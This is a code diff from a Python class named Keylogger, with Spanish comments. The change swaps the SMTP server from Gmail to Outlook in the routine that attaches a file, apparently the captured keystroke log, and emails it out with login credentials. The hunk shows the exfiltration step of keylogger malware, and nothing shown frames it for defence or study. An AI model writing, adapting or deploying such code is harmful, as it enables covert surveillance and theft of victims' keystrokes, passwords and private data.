@@ -149,7 +149,8 @@ class Keylogger:
         adjunto.set_payload(open(self.m,"rb").read())
         adjunto.add_header("content-Disposition",'attachment; filename={}'.format(self.m))
         mensaje.attach(adjunto)
-        smtp = smtplib.SMTP("smtp.gmail.com", 587)
+        #smtp = smtplib.SMTP("smtp.gmail.com", 587) #Para correo GMAIL
+        smtp = smtplib.SMTP("smtp.outlook.com", 587) #Para correo outlook
         smtp.starttls()
         smtp.login(email, password)
         smtp.sendmail(email, email, mensaje.as_string())
